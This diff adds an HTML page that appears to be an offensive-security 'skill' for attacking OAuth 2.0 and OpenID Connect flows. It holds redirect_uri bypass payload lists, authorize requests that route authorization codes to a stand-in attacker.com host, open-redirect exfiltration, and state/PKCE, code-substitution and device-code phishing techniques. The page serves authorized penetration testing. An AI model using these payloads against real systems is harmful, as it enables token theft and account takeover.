@@ -1,0 +1,318 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>attacking-oauth-oidc — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / attacking-oauth-oidc</div>
+  <h1 class="sk">attacking-oauth-oidc</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-26</span>
+  </div>
+  <p class="sdesc">Attack OAuth 2.0 and OpenID Connect flows — enumerate endpoints from the OIDC discovery document, break redirect_uri validation with path traversal, open-redirect chaining, subdomain and regex weakness, and %2F/@ parser tricks, exploit missing state (callback CSRF) and absent or downgraded PKCE, steal codes and tokens via open redirectors and referer leakage, replay and inject authorization codes across clients, escalate scope and bypass consent, confuse access_token with id_token, and take over accounts through &quot;Sign in with X&quot; email trust and device-code consent phishing. Use when you see /authorize, /oauth/token, response_type, redirect_uri, client_id, code= or state= parameters, a &quot;Sign in with Google/Microsoft/GitHub&quot; button, or an OIDC discovery document at /.well-known/openid-configuration.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><p>OAuth is a delegation protocol whose security lives entirely in parameters the browser forwards — <code>redirect_uri</code>, <code>state</code>, and <code>scope</code> — so most breaks are the authorization server or the client trusting one of those a little too much. The token is the prize; the flow is the attack surface. Follow the redirect that carries the code, and you follow the credential.</p>
+<p>Only against systems you are authorized to test.</p>
+<h2>When to Use</h2>
+<ul>
+<li>A login page offers "Sign in with Google / Microsoft / GitHub / Apple" or any</li>
+</ul>
+<p>federated identity button</p>
+<ul>
+<li>You see <code>/authorize</code>, <code>/oauth/token</code>, <code>/oauth2/authorize</code>, or a callback URL</li>
+</ul>
+<p>carrying <code>code=</code>, <code>state=</code>, or <code>#access_token=</code></p>
+<ul>
+<li>Requests contain <code>response_type</code>, <code>redirect_uri</code>, <code>client_id</code>, <code>scope</code>, or</li>
+</ul>
+<p><code>nonce</code></p>
+<ul>
+<li>An OIDC discovery document is served at <code>/.well-known/openid-configuration</code></li>
+<li>The app exchanges an authorization code server-side for tokens, or accepts an</li>
+</ul>
+<p><code>id_token</code> to establish a session</p>
+<ul>
+<li>A first-party SPA or mobile app runs the authorization-code-with-PKCE flow</li>
+</ul>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Forging, cracking, or tampering with the issued token itself</strong> (alg confusion,</li>
+</ul>
+<p><code>kid</code> injection, weak HMAC secret, <code>none</code>) — use <a class="xref" href="attacking-jwt.html"><code>attacking-jwt</code></a></p>
+<ul>
+<li><strong>General web application testing</strong> unrelated to the auth flow — use</li>
+</ul>
+<p><a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a></p>
+<ul>
+<li><strong>The resource API after you already hold a valid access token</strong> — use</li>
+</ul>
+<p><a class="xref" href="testing-apis.html"><code>testing-apis</code></a></p>
+<ul>
+<li>**Entra/Azure AD tenant consent, app registration abuse, and multi-tenant app</li>
+</ul>
+<p>attacks specifically** — use <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a></p>
+<ul>
+<li>**The human side — running consent-phishing or illicit-grant campaigns at</li>
+</ul>
+<p>scale against real users** — use <a class="xref" href="performing-social-engineering.html"><code>performing-social-engineering</code></a></p>
+<h2>Enumerate the Server: Discovery Document First</h2>
+<p>The OIDC discovery document hands you the entire attack map — every endpoint, the supported flows, and the key set.</p>
+<pre><code>curl -s https://target/.well-known/openid-configuration | jq .
+# Also try, per-tenant / per-realm:
+#   https://target/.well-known/oauth-authorization-server
+#   https://login.target/&lt;tenant&gt;/v2.0/.well-known/openid-configuration
+#   https://target/auth/realms/&lt;realm&gt;/.well-known/openid-configuration   (Keycloak)</code></pre>
+<p>Read these fields specifically:</p>
+<ul>
+<li><code>authorization_endpoint</code>, <code>token_endpoint</code>, <code>userinfo_endpoint</code> — the flow</li>
+<li><code>jwks_uri</code> — the keys that validate <code>id_token</code>s (feeds <a class="xref" href="attacking-jwt.html"><code>attacking-jwt</code></a>)</li>
+<li><code>response_types_supported</code> — is <code>token</code> or <code>id_token token</code> (implicit)</li>
+</ul>
+<p>allowed? Is <code>code</code> the only option, or can you downgrade?</p>
+<ul>
+<li><code>grant_types_supported</code> — is <code>implicit</code>, <code>password</code>, or</li>
+</ul>
+<p><code>urn:ietf:params:oauth:grant-type:device_code</code> present?</p>
+<ul>
+<li><code>code_challenge_methods_supported</code> — if absent, PKCE may not be enforced</li>
+<li><code>scopes_supported</code>, <code>claims_supported</code> — the escalation menu</li>
+</ul>
+<p>Pull the client bundle too: SPA JavaScript almost always inlines the <code>client_id</code>, the configured <code>redirect_uri</code>, and the scope list.</p>
+<h2>redirect_uri Validation: The Core Break</h2>
+<p>Everything hinges on where the authorization server is willing to send the code. If you can make it send the code to a host you control, the flow is over. Work through the validation weaknesses — a permissive registration or a prefix/substring match instead of an exact match is the standard finding.</p>
+<pre><code>Registered: https://app.example.com/callback
+
+Path traversal / appended path (prefix match, not exact)
+  https://app.example.com/callback/../../attacker
+  https://app.example.com/callback/anything          (allowed if it startswith-checks)
+  https://app.example.com/callback.attacker.com/
+
+Subdomain / domain-suffix weakness (regex or "endswith" match)
+  https://attacker.app.example.com/callback
+  https://app.example.com.attacker.com/callback
+  https://appXexample.com/callback                    (unescaped . in regex)
+
+Parser confusion — validator and browser disagree on the host
+  https://attacker.com\@app.example.com/callback
+  https://app.example.com@attacker.com/callback
+  https://attacker.com%2F@app.example.com/
+  https://attacker.com#@app.example.com/
+  https://attacker.com%23.app.example.com/
+
+Scheme / userinfo / whitespace
+  http://app.example.com/callback                     (downgrade to plaintext)
+  https://app.example.com%00.attacker.com/callback
+  ///attacker.com/callback   //attacker.com/callback
+
+localhost is frequently allow-listed with no port check
+  http://localhost:1337/callback   http://127.0.0.1/callback
+  http://localhost.attacker.com/callback</code></pre>
+<p>An authorize request pointing the code at your host:</p>
+<pre><code>GET /authorize?response_type=code
+    &amp;client_id=REAL_CLIENT_ID
+    &amp;redirect_uri=https://attacker.com/callback
+    &amp;scope=openid%20email%20profile
+    &amp;state=xyz HTTP/1.1
+Host: login.target</code></pre>
+<p>If that returns a code to <code>attacker.com</code>, you exchange it (or the victim's browser delivers theirs). Also test <strong>each place <code>redirect_uri</code> is read</strong> — the authorize request, the token exchange, and any stored per-client default — because some servers validate strictly at <code>/authorize</code> and loosely at <code>/token</code>, or vice versa.</p>
+<h2>Open Redirector as Exfil Channel</h2>
+<p>When <code>redirect_uri</code> must stay on the real domain, an open redirect <em>on that domain</em> becomes the exfiltration path: the server sends the code to the allow-listed host, which 302s it — and the <code>code</code> in the query string, or the whole fragment — onward to you.</p>
+<pre><code>redirect_uri=https://app.example.com/redirect?next=https://attacker.com/
+# code lands on app.example.com, its open redirect forwards it (and often the
+# ?code=... query, via Referer or an explicit passthrough) to attacker.com</code></pre>
+<p>Chase any <code>next=</code>, <code>returnUrl=</code>, <code>RelayState=</code>, or <code>continue=</code> parameter on the allow-listed origin. This is the reason an "exact redirect_uri match" that ends on your own domain is still not safe.</p>
+<h2>state: CSRF on the Callback</h2>
+<p><code>state</code> is OAuth's CSRF token. If it is absent, static, predictable, or not verified on return, an attacker stitches <strong>their</strong> authorization code onto the <strong>victim's</strong> session — the login-CSRF / account-injection attack.</p>
+<pre><code>1. Attacker starts the flow, captures their own code but does NOT complete it.
+2. Attacker delivers the callback to the victim:
+   https://app.example.com/callback?code=ATTACKER_CODE   (no/ignored state)
+3. Victim's browser completes it; victim's account is now linked to the
+   attacker's identity provider account -&gt; attacker logs in as the victim.</code></pre>
+<p>Test: remove <code>state</code> entirely, replay a <code>state</code> from a previous flow, and change one character of the returned <code>state</code>. If the callback still completes, it is not being verified. <code>nonce</code> gets the same treatment in OIDC — its job is replay protection on the <code>id_token</code>.</p>
+<h2>PKCE: Absence and Downgrade</h2>
+<p>PKCE binds the code to the client that requested it, defeating code interception. Public clients (SPA, mobile) that skip it are exposed to any attacker who grabs the code from a redirect, referer, or intercepting app.</p>
+<pre><code># Authorize with a challenge:
+GET /authorize?...&amp;code_challenge=BASE64URL(SHA256(verifier))&amp;code_challenge_method=S256
+
+Checks:
+- Omit code_challenge entirely -&gt; does /token still return a token? (not enforced)
+- Send code_challenge_method=plain with challenge == verifier (downgrade)
+- Exchange the code with the WRONG code_verifier -&gt; is it accepted? (not verified)
+- Reuse the same verifier across two flows</code></pre>
+<p>If a code obtained under one flow can be redeemed without the matching verifier, PKCE is decorative.</p>
+<h2>Implicit Flow: Token Leakage</h2>
+<p><code>response_type=token</code> / <code>id_token token</code> returns the token in the URL <strong>fragment</strong>, which leaks through browser history, <code>Referer</code> headers on subresource loads, and any JavaScript on the callback page.</p>
+<pre><code>GET /authorize?response_type=token&amp;client_id=...&amp;redirect_uri=https://app.example.com/cb
+# -&gt; 302 to https://app.example.com/cb#access_token=ya29...&amp;token_type=Bearer</code></pre>
+<p>Force implicit even where code flow is expected (<code>response_type=token</code>), and pair it with a redirect_uri or open-redirect weakness — the fragment rides along and the token exfiltrates. Prefer reporting a downgrade-to-implicit as high severity: it turns a fragment into a bearer credential in the URL bar.</p>
+<h2>Code Injection, Replay, and Cross-Client Substitution</h2>
+<p>The authorization code is single-use and client-bound in a correct implementation. Test all three properties.</p>
+<ul>
+<li><strong>Replay</strong> — redeem the same <code>code</code> twice at <code>/token</code>. The second attempt must</li>
+</ul>
+<p>fail; a token on the second try means codes are not invalidated.</p>
+<ul>
+<li><strong>Injection</strong> — inject a code obtained in your own session into the victim's</li>
+</ul>
+<p>callback (the <code>state</code>-less attack above), or inject the victim's leaked code into your session to log in as them.</p>
+<ul>
+<li><strong>Cross-client substitution</strong> — obtain a code issued for <code>client_id=A</code> and</li>
+</ul>
+<p>redeem it at <code>/token</code> with <code>client_id=B</code> (both apps on the same authorization server). If the server does not bind the code to the issuing client, a code minted for a low-value app buys tokens for a high-value one.</p>
+<pre><code>POST /oauth/token HTTP/1.1
+Host: login.target
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=authorization_code&amp;code=VICTIM_OR_OTHER_CLIENT_CODE
+&amp;redirect_uri=https://app.example.com/callback
+&amp;client_id=DIFFERENT_CLIENT_ID&amp;client_secret=...</code></pre>
+<h2>Scope Escalation and Consent Bypass</h2>
+<p>Add scopes to the authorize request and see whether the server grants them without a fresh consent prompt — especially on <strong>re-authorization</strong>, where many servers skip consent for an already-authorized client and silently attach the new scopes.</p>
+<pre><code># Request more than the app normally asks for:
+scope=openid email profile offline_access admin read:all</code></pre>
+<p>Check: does <code>offline_access</code> (a long-lived refresh token) get granted silently? Are scopes the client never requested honored if you inject them? Does the returned token's actual scope exceed what was consented? Downgrade attacks matter too — a first authorization with narrow scope, then a silent re-auth widening it.</p>
+<h2>response_mode / response_type Confusion</h2>
+<p>Mixing response parameters can move a token to a place validation does not cover or downgrade the flow.</p>
+<pre><code>response_mode=form_post   -&gt; token delivered in a POST body (bypasses fragment
+                             handling and some referer protections)
+response_mode=web_message -&gt; token posted via postMessage; test the target-origin
+                             check for a wildcard or missing origin validation
+response_type=code%20token / code%20id_token  -&gt; hybrid flow; a code AND a
+                             front-channel token, doubling the leak surface</code></pre>
+<h2>access_token vs id_token Confusion</h2>
+<p>The <code>access_token</code> is for calling the resource API; the <code>id_token</code> is proof of authentication for the client. Backends routinely confuse them.</p>
+<ul>
+<li>A resource server that accepts an <strong><code>id_token</code></strong> as a bearer token (because</li>
+</ul>
+<p>both are JWTs) trusts a token the client should never present to it.</p>
+<ul>
+<li>A client that authenticates a session from an <strong><code>access_token</code></strong> — an opaque or</li>
+</ul>
+<p>loosely-validated string — instead of a properly validated <code>id_token</code> can be fed a token minted for a different audience.</p>
+<ul>
+<li>The token endpoint returns both; try each at every consumer and watch which are</li>
+</ul>
+<p>accepted where they should not be.</p>
+<h2>id_token Validation Flaws</h2>
+<p>The client must validate the <code>id_token</code> signature against <code>jwks_uri</code> <strong>and</strong> the claims. Missing claim checks are the account-takeover path.</p>
+<ul>
+<li><strong><code>iss</code></strong> not checked — a token from a different (attacker-controlled) issuer is</li>
+</ul>
+<p>accepted.</p>
+<ul>
+<li><strong><code>aud</code></strong> not checked — a token minted for <em>another client</em> on the same IdP</li>
+</ul>
+<p>(Google, Microsoft) is replayed here. This is the classic multi-tenant/social IdP takeover.</p>
+<ul>
+<li><strong><code>azp</code></strong> (authorized party) ignored on multi-audience tokens.</li>
+<li><strong><code>exp</code> / <code>nonce</code></strong> not enforced — replay of an old or captured token.</li>
+</ul>
+<p>The signature-side attacks — <code>alg:none</code>, <code>alg</code> HS256/RS256 confusion, <code>kid</code> injection, <code>jku</code>/<code>x5u</code> pointing at attacker keys — are in <strong><a class="xref" href="attacking-jwt.html"><code>attacking-jwt</code></a></strong>. Fetch <code>jwks_uri</code> from discovery and hand it off there.</p>
+<h2>"Sign in with X" Account Takeover via Email Trust</h2>
+<p>The highest-yield federation bug: a client that links or creates accounts by the <strong>email</strong> claim, trusting it as a verified unique key.</p>
+<ul>
+<li>Provider returns <code>email</code> without <code>email_verified</code>, or the client ignores</li>
+</ul>
+<p><code>email_verified</code> — sign up at an IdP with the victim's email (unverified) and the client links you to their account.</p>
+<ul>
+<li>The client matches an existing local account by email and federates it — pre-hijack</li>
+</ul>
+<p>or takeover by registering the same email at a permissive provider.</p>
+<ul>
+<li>Multiple IdP buttons ("Google" and "GitHub") both keyed on email — log in via</li>
+</ul>
+<p>the provider where you can control an unverified email matching the victim.</p>
+<p>Always inspect the <code>userinfo</code> / <code>id_token</code> claims actually returned and whether <code>email_verified</code> is present and enforced before any account link.</p>
+<h2>Device Code Flow and Consent Phishing (Illicit Grant)</h2>
+<p>The device authorization grant (<code>urn:ietf:params:oauth:grant-type:device_code</code>) and the plain consent screen are the phishing surface: the attacker starts a flow, gets a <code>user_code</code> / verification URL, and induces the victim to approve it — yielding tokens to the attacker with no fake login page.</p>
+<pre><code>POST /oauth/device/code   client_id=REAL_CLIENT_ID&amp;scope=openid%20offline_access
+# -&gt; device_code, user_code, verification_uri
+# Victim visits the REAL verification_uri, enters the code, approves -&gt;
+POST /oauth/token   grant_type=...device_code&amp;device_code=...&amp;client_id=...
+# attacker polls and receives access + refresh tokens</code></pre>
+<p>The victim sees the genuine provider consent page — that is what makes it effective. Running this against real users at scale is a <a class="xref" href="performing-social-engineering.html"><code>performing-social-engineering</code></a> engagement; for Entra-specific illicit consent grants (malicious multi-tenant apps), use <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a>.</p>
+<h2>Rationalizations to Reject</h2>
+<ul>
+<li><em>"redirect_uri is validated against an allow-list."</em> Exact match or prefix?</li>
+</ul>
+<p>Test traversal, subdomain suffix, <code>@</code>/<code>%2F</code>/<code>#</code> parser tricks, and an open redirector <em>on</em> the allow-listed host.</p>
+<ul>
+<li><em>"We use the authorization code flow, not implicit — it's safe."</em> Codes leak,</li>
+</ul>
+<p>replay, and cross clients. And check whether <code>response_type=token</code> still works.</p>
+<ul>
+<li><em>"state is optional; the SDK handles CSRF."</em> Remove it and see. A callback that</li>
+</ul>
+<p>completes without a verified <code>state</code> is account-injectable.</p>
+<ul>
+<li><em>"PKCE is configured."</em> Configured is not enforced. Omit the challenge, send a</li>
+</ul>
+<p>wrong verifier, downgrade to <code>plain</code>.</p>
+<ul>
+<li><em>"It's a JWT from Google, so it's trusted."</em> Trusted for which <code>aud</code>? A token</li>
+</ul>
+<p>minted for another client is a takeover if you don't check the audience.</p>
+<ul>
+<li><em>"We match users by email — email is unique."</em> Only if <code>email_verified</code> is</li>
+</ul>
+<p>present and enforced. Unverified email is attacker-chosen.</p>
+<ul>
+<li><em>"The consent screen is the real provider's, so it's legitimate."</em> Device-code</li>
+</ul>
+<p>and illicit-grant phishing rely on exactly that genuine screen.</p>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Credential Access</strong> (TA0006)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1528/">T1528</a> Steal Application Access Token — see also <a class="xref" href="testing-apis.html"><code>testing-apis</code></a>, <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a>, <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1606/">T1606</a> Forge Web Credentials — see also <a class="xref" href="attacking-jwt.html"><code>attacking-jwt</code></a></li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
+<h2>References</h2>
+<ul>
+<li><a class="xref" href="attacking-jwt.html"><code>attacking-jwt</code></a> — forging, cracking, and validation-bypassing the <code>id_token</code> /</li>
+</ul>
+<p><code>access_token</code> once you have it (alg confusion, <code>kid</code>, <code>jku</code>, weak secret)</p>
+<ul>
+<li><a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a> — the app surrounding the login flow</li>
+<li><a class="xref" href="testing-apis.html"><code>testing-apis</code></a> — exercising the resource server once you hold a token</li>
+<li><a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a> — Entra/Azure tenant consent, app registration, and</li>
+</ul>
+<p>multi-tenant illicit-grant abuse</p>
+<ul>
+<li><a class="xref" href="reporting-security-findings.html"><code>reporting-security-findings</code></a> — severity for redirect_uri, state, and</li>
+</ul>
+<p>account-takeover findings</p>
+<ul>
+<li>Burp Suite (Repeater for authorize/token requests, browser proxy for the full</li>
+</ul>
+<p>redirect chain); the OAuth-focused Burp extensions — EsPReSSO and the JWT editors for decoding front-channel tokens; mitmproxy for capturing the fragment and cross-origin <code>postMessage</code> traffic that Burp's HTTP history misses</p></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
